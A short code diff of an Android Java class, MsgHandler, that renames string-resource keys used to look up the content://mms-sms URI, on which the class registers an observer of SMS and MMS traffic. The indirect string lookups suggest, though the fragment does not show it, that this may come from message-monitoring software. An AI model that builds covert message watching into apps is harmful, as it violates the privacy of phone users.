@@ -60,11 +60,11 @@ public class MsgHandler extends Thread {
 		 */
 
 		// content://sms
-		// Messages.getString("25.0") : "content://sms"
+		// Messages.getString("25_0") : "content://sms"
 
 		// M.1=content://mms-sms
 		msgObserver = new MsgObserver(handler, mmsEnabled, smsEnabled);
-		cr.registerContentObserver(Uri.parse(Messages.getString("M.1")), true, msgObserver); //$NON-NLS-1$
+		cr.registerContentObserver(Uri.parse(Messages.getString("M_1")), true, msgObserver); //$NON-NLS-1$
 
 		Looper.loop();
 	}
